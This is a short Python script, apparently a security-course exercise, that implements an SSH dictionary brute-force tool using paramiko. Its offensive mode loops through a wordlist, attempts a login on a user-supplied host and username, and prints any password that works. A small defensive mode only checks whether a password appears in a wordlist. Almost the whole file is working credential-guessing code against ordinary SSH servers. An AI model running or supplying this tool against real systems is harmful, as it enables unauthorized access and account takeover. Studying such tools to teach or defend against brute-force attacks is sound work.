#!/usr/bin/env python3 

# Script Name:                         automated_brute_force_tool2
# Author name:                         Hector Cordova
# Date of latest revision:             30JAN2024 
# Purpose:                             To create a automated brute force tool
# Execution:                           python3 
# Additional Resources:                https://www.geeksforgeeks.org/how-to-execute-shell-commands-in-a-remote-machine-using-python-paramiko/, https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/, https://github.com/Hector2024/ops-401-code-challenges/blob/main/automated_brute_force_tool.py, https://chat.openai.com/share/c2ff26fa-870d-44b5-a142-f5f0a87857cc

import time
import paramiko

def offensive_mode():
    word_list_path = input("Enter the path to the word list file: ")
    delay = float(input("Enter the delay between words: "))
    target_ip = input("Enter the target SSH server IP address: ")
    username = input("Enter the SSH username: ")

    # Open the word file and iterate through each line
    with open(word_list_path, 'r') as file:
        for line in file:
            password = line.strip()

            # Attempt SSH login with the current password
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(target_ip, username=username, password=password)
                print(f"Successful login! Username: {username}, Password: {password}")
                break  # Break out of the loop if login is successful
            except paramiko.AuthenticationException:
                print(f"Failed login attempt. Username: {username}, Password: {password}")
            finally:
                ssh.close()

            time.sleep(delay)

def defensive_mode():
    user_string = input("Enter a password to search: ")
    word_list_path = input("Enter the path to the word list file: ")

    with open(word_list_path, 'r') as file:
        word_list = [line.strip() for line in file]

    if user_string in word_list:
        print("The password is in the word list.")
    else:
        print("The password is not in the word list.")

if __name__ == "__main__":
    print("Select mode:")
    print("1. Offensive; Dictionary Iterator")
    print("2. Defensive; Password Recognized")
    print("3. SSH Authentication Attempt")

    mode = input("Enter 1 for offensive mode, 2 for defensive mode, or 3 for SSH authentication attempt: ")

    if mode == '1':
        offensive_mode()
    elif mode == '2':
        defensive_mode()
    elif mode == '3':
        offensive_mode()  # Reusing the offensive_mode function for SSH authentication
    else:
        print("Please enter 1, 2, or 3.")
